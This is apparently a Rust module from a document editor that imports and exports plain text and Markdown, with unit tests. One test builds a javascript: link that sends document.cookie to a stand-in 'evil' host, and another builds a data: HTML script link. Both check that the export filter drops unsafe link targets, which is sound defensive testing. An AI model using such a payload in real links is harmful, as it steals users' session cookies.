//! Plain-text and Markdown import (importers in the JS app).

use crate::format::*;
use crate::model::{Document, Paragraph, Run};
use crate::numbering::ListKind;

/// One paragraph per line.
pub fn from_text(text: &str) -> Document {
    let text = text.replace("\r\n", "\n").replace('\r', "\n");
    Document::new(text.split('\n').map(Paragraph::new).collect())
}

/// Decode a text file's bytes: UTF-8 (with or without BOM), UTF-16 with a BOM or sniffed
/// from its NUL bytes, else Windows-1252.
pub fn decode_text(bytes: &[u8]) -> String {
    let utf16 = |b: &[u8], le: bool| String::from_utf16_lossy(&b.chunks_exact(2).map(|c| if le { u16::from_le_bytes([c[0], c[1]]) } else { u16::from_be_bytes([c[0], c[1]]) }).collect::<Vec<_>>());
    if let Some(b) = bytes.strip_prefix(&[0xEF, 0xBB, 0xBF]) { return String::from_utf8_lossy(b).into_owned(); }
    if let Some(b) = bytes.strip_prefix(&[0xFF, 0xFE]) { return utf16(b, true); }
    if let Some(b) = bytes.strip_prefix(&[0xFE, 0xFF]) { return utf16(b, false); }
    // Without a BOM, UTF-16 shows its ASCII as NULs in the odd (LE) or even (BE) bytes only;
    // text files never contain NULs otherwise.
    if bytes.len() >= 2 && bytes.len() % 2 == 0 {
        let nul = |k: usize| bytes.iter().skip(k).step_by(2).filter(|b| **b == 0).count();
        let (even, odd) = (nul(0), nul(1));
        if odd > 0 && even * 10 < odd { return utf16(bytes, true); }
        if even > 0 && odd * 10 < even { return utf16(bytes, false); }
    }
    if let Ok(s) = std::str::from_utf8(bytes) { return s.to_string(); }
    const HIGH: [char; 32] = ['€', '\u{81}', '‚', 'ƒ', '„', '…', '†', '‡', 'ˆ', '‰', 'Š', '‹', 'Œ', '\u{8D}', 'Ž', '\u{8F}', '\u{90}', '‘', '’', '“', '”', '•', '–', '—', '˜', '™', 'š', '›', 'œ', '\u{9D}', 'ž', 'Ÿ'];
    bytes.iter().map(|&b| if (0x80..0xA0).contains(&b) { HIGH[b as usize - 0x80] } else { b as char }).collect()
}

/// Markdown headings, lists, emphasis, code and links.
pub fn from_markdown(text: &str) -> Document {
    let mut doc = Document::new(vec![]);
    doc.paragraphs.clear();
    let mut bullet: Option<u32> = None;
    let mut number: Option<u32> = None;
    for raw in text.replace("\r\n", "\n").split('\n') {
        let line = raw.trim_end();
        let trimmed = line.trim_start();
        let indent = ((line.len() - trimmed.len()) / 2).min(8) as u8;
        let mut p = Paragraph::default();
        let content;
        if let Some(h) = trimmed.strip_prefix('#').map(|_| trimmed.trim_start_matches('#')).filter(|r| r.starts_with(' ')) {
            let level = trimmed.len() - h.len();
            p.style = Some(format!("Heading{}", level.min(3)));
            content = h.trim().to_string();
            bullet = None; number = None;
        } else if let Some(item) = trimmed.strip_prefix("- ").or_else(|| trimmed.strip_prefix("* ")).or_else(|| trimmed.strip_prefix("+ ")) {
            let id = *bullet.get_or_insert_with(|| doc.numbering.new_list(ListKind::Bullet));
            p.props.numbering = Some((id, indent));
            content = item.to_string();
        } else if let Some(dot) = trimmed.find(". ").filter(|&d| d > 0 && trimmed[..d].chars().all(|c| c.is_ascii_digit())) {
            let id = *number.get_or_insert_with(|| doc.numbering.new_list(ListKind::Number));
            p.props.numbering = Some((id, indent));
            content = trimmed[dot + 2..].to_string();
        } else if let Some(q) = trimmed.strip_prefix("> ") {
            p.props.indent_left = Some(720);
            content = q.to_string();
            p.runs = inline(&content, RunProps { italic: Some(true), ..Default::default() });
            doc.paragraphs.push(p);
            continue;
        } else if trimmed == "---" || trimmed == "***" {
            p.props.borders = Some(ParaBorders { bottom: Some(Border { width: 0.75, space: 1.0, color: Some(Color(0x99, 0x99, 0x99)) }), ..Default::default() });
            doc.paragraphs.push(p);
            continue;
        } else {
            if trimmed.is_empty() { bullet = None; number = None; continue; }
            content = trimmed.to_string();
        }
        p.runs = inline(&content, RunProps::default());
        doc.paragraphs.push(p);
    }
    if doc.paragraphs.is_empty() { doc.paragraphs.push(Paragraph::default()); }
    doc
}

/// `**bold**`, `*italic*`/`_italic_`, `` `code` `` and `[text](url)`.
fn inline(text: &str, base: RunProps) -> Vec<Run> {
    let mut runs = vec![];
    let chars: Vec<char> = text.chars().collect();
    let (mut bold, mut italic) = (false, false);
    let mut buf = String::new();
    let flush = |buf: &mut String, runs: &mut Vec<Run>, bold: bool, italic: bool, code: bool, link: Option<String>| {
        if buf.is_empty() { return; }
        let mut props = base.clone();
        if bold { props.bold = Some(true); }
        if italic { props.italic = Some(true); }
        if code { props.font = Some("Courier New".into()); }
        if link.is_some() { props.color = Some(Some(Color(0x05, 0x63, 0xC1))); props.underline = Some("single".into()); }
        runs.push(Run { text: std::mem::take(buf), props, link, ..Default::default() });
    };
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '*' && chars.get(i + 1) == Some(&'*') { flush(&mut buf, &mut runs, bold, italic, false, None); bold = !bold; i += 2; continue; }
        if c == '*' || c == '_' && (i == 0 || !chars[i - 1].is_alphanumeric()) || c == '_' && italic { flush(&mut buf, &mut runs, bold, italic, false, None); italic = !italic; i += 1; continue; }
        if c == '`' {
            if let Some(end) = chars[i + 1..].iter().position(|&x| x == '`') {
                flush(&mut buf, &mut runs, bold, italic, false, None);
                buf = chars[i + 1..i + 1 + end].iter().collect();
                flush(&mut buf, &mut runs, bold, italic, true, None);
                i += end + 2; continue;
            }
        }
        if c == '[' {
            let rest: String = chars[i..].iter().collect();
            // The link text is up to the first `]` (an unclosed `[` stays text); its URL ends at the first `)` after it.
            if let Some(close) = rest[1..].find(['[', ']']).map(|k| k + 1).filter(|&k| rest[k..].starts_with("](")) {
                if let Some(open) = rest[close..].find(')').map(|k| k + close) {
                    flush(&mut buf, &mut runs, bold, italic, false, None);
                    buf = rest[1..close].to_string();
                    let url = rest[close + 2..open].to_string();
                    flush(&mut buf, &mut runs, bold, italic, false, Some(url));
                    i += rest[..=open].chars().count(); continue;
                }
            }
        }
        buf.push(c);
        i += 1;
    }
    flush(&mut buf, &mut runs, bold, italic, false, None);
    runs
}

/// Plain-text export (one line per paragraph, list markers kept as text).
pub fn to_text(doc: &Document) -> String {
    // List items keep their label and a tab, as Word writes them.
    let mut markers = crate::numbering::MarkerCounter::default();
    let lines: Vec<String> = doc.paragraphs.iter().map(|p| {
        let label = doc.para_format(p).numbering.and_then(|(num, ilvl)| markers.next(&doc.numbering, num, ilvl).map(|l| format!("{}{}\t", "\t".repeat(ilvl as usize), text_bullet(&l))));
        format!("{}{}", label.unwrap_or_default(), p.text().replace(crate::chars::OBJECT, ""))
    }).collect();
    lines.join("\n")
}

/// The selection as plain text for the clipboard: when it spans paragraphs, each list item
/// whose start is selected keeps its label and a tab, numbered as in the document (Word does this).
pub fn selection_text(doc: &Document) -> String {
    let (s, e) = doc.range();
    let text = doc.selected_text();
    if !text.contains('\n') { return text; }
    let mut markers = crate::numbering::MarkerCounter::default();
    let (mut at, mut out) = (0, String::new());
    for p in &doc.paragraphs {
        let len = p.len();
        let label = doc.para_format(p).numbering.and_then(|(num, ilvl)| markers.next(&doc.numbering, num, ilvl).map(|l| format!("{}{}\t", "\t".repeat(ilvl as usize), text_bullet(&l))));
        if at + len >= s && at <= e {
            if at >= s && at < e { out.push_str(&label.unwrap_or_default()); }
            out.push_str(&doc.text_between(s.max(at), e.min(at + len)));
            if e > at + len { out.push('\n'); }
        }
        at += len + 1;
        if at > e { break; }
    }
    out
}

/// Symbol-font bullets (private-use code points) become the plain bullet.
fn text_bullet(label: &str) -> String {
    label.chars().map(|c| if ('\u{F000}'..='\u{F0FF}').contains(&c) { if c == '\u{F0A7}' { '▪' } else if c == '\u{F06F}' { 'o' } else { '•' } } else { c }).collect()
}

/// a link target fit to write into exported files: web, mail, an in-document
/// `#bookmark` or a relative path, never `javascript:`, `data:`, `file:` or other schemes.
pub fn safe_link(target: &str) -> bool {
    let t = target.trim();
    let scheme = t.split_once(':').map(|(s, _)| s).filter(|s| !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || "+-.".contains(c)) && !s.contains(['/', '#', '?']));
    match scheme {
        Some(s) => ["http", "https", "mailto", "ftp", "tel"].iter().any(|ok| s.eq_ignore_ascii_case(ok)),
        None => !t.chars().any(|c| c.is_control()),
    }
}

/// Markdown export of headings, lists and emphasis.
pub fn to_markdown(doc: &Document) -> String {
    let mut out = String::new();
    for p in &doc.paragraphs {
        let f = doc.para_format(p);
        let mut line = String::new();
        if f.outline_level < 6 { line.push_str(&"#".repeat(f.outline_level as usize + 1)); line.push(' '); }
        if let Some((num, ilvl)) = f.numbering {
            line.push_str(&"  ".repeat(ilvl as usize));
            line.push_str(if doc.numbering.kind(num) == Some(ListKind::Bullet) { "- " } else { "1. " });
        }
        for r in &p.runs {
            if r.image.is_some() { continue; }
            let rf = doc.run_format(p, r);
            let mut t = r.text.replace(['\u{000B}', '\u{000C}'], "  \n");
            if rf.bold && f.outline_level >= 6 && !t.trim().is_empty() { t = format!("**{t}**"); }
            if rf.italic && !t.trim().is_empty() { t = format!("*{t}*"); }
            if let Some(l) = r.link.as_deref().filter(|l| safe_link(l)) { t = format!("[{t}]({})", l.replace(' ', "%20").replace(')', "%29")); }
            line.push_str(&t);
        }
        out.push_str(&line);
        out.push_str("\n\n");
    }
    out.trim_end().to_string() + "\n"
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn text_import_decodes_1252_and_bomless_utf16() {
        assert_eq!(decode_text(&[0x80, b' ', b'5']), "€ 5");
        let le: Vec<u8> = "مرحبا Hi".encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        assert_eq!(decode_text(&le), "مرحبا Hi");
        let be: Vec<u8> = "Hello".encode_utf16().flat_map(|u| u.to_be_bytes()).collect();
        assert_eq!(decode_text(&be), "Hello");
        let bom: Vec<u8> = [0xFF, 0xFE].into_iter().chain("نص".encode_utf16().flat_map(|u| u.to_le_bytes())).collect();
        assert_eq!(decode_text(&bom), "نص");
        assert_eq!(decode_text("\u{FEFF}نص عربي".as_bytes()), "نص عربي");
        assert_eq!(decode_text("abcd".as_bytes()), "abcd");
    }
    #[test]
    fn text_export_keeps_list_labels() {
        let d = from_markdown("- one\n- two\n\n1. first\n2. second\n");
        let t = to_text(&d);
        assert!(t.contains("\tone") && t.contains("\ttwo") && !t.starts_with("one"), "{t:?}");
        assert!(t.contains("1.\tfirst") && t.contains("2.\tsecond"), "{t:?}");
    }
    #[test]
    fn copied_list_items_keep_their_labels() {
        let mut d = from_markdown("مقدمة\n\n1. الأول\n2. الثاني\n3. الثالث\n");
        let n = d.len();
        d.select(0, n);
        assert_eq!(selection_text(&d), "مقدمة\n1.\tالأول\n2.\tالثاني\n3.\tالثالث");
        // A partial copy keeps the items' own numbers.
        let from = d.paragraphs[0].len() + 1 + d.paragraphs[1].len() + 1;
        d.select(from, n);
        assert_eq!(selection_text(&d), "2.\tالثاني\n3.\tالثالث");
        // Within one item, just the text.
        d.select(from, from + 3);
        assert_eq!(selection_text(&d), "الث");
    }
    #[test]
    fn markdown_round_trip() {
        let d = from_markdown("# Title\n\nSome **bold** and *it* [link](https://x.y)\n\n- one\n- two\n");
        assert_eq!(d.paragraphs.len(), 4);
        assert_eq!(d.paragraphs[0].style.as_deref(), Some("Heading1"));
        assert!(d.run_format(&d.paragraphs[1], &d.paragraphs[1].runs[1]).bold);
        let md = to_markdown(&d);
        assert!(md.contains("# Title") && md.contains("**bold**") && md.contains("- two"));
    }
    #[test]
    fn markdown_export_drops_unsafe_link_targets() {
        // a received document's javascript: link must not become a live Markdown link.
        let mut d = from_markdown("[safe](https://x.y) [mail](mailto:a@b.c) [bm](#top) [rel](notes/a.md)\n");
        let p = &mut d.paragraphs[0];
        p.runs.push(Run { text: "evil".into(), link: Some("javascript:fetch('https://evil/?c='+document.cookie)".into()), ..Default::default() });
        p.runs.push(Run { text: "data".into(), link: Some(" DATA:text/html,<script>".into()), ..Default::default() });
        p.runs.push(Run { text: "رابط".into(), link: Some("https://example.com/مرحبا بك".into()), ..Default::default() });
        let md = to_markdown(&d);
        for ok in ["[safe](https://x.y)", "[mail](mailto:a@b.c)", "[bm](#top)", "[rel](notes/a.md)", "[رابط](https://example.com/مرحبا%20بك)"] { assert!(md.contains(ok), "{ok} in {md}"); }
        assert!(!md.contains("javascript") && !md.contains("DATA:"), "{md}");
        assert!(md.contains("evil") && md.contains("data"), "the text stays");
    }

    #[test]
    fn markdown_unclosed_bracket_keeps_later_links() {
        let d = from_markdown("a [b (c) see [x](u1) and [y](u2)\n");
        let links: Vec<_> = d.paragraphs[0].runs.iter().filter_map(|r| r.link.clone().map(|l| (r.text.clone(), l))).collect();
        assert_eq!(links, vec![("x".to_string(), "u1".to_string()), ("y".to_string(), "u2".to_string())]);
        assert!(d.paragraphs[0].text().starts_with("a [b (c) see x"));
    }
}
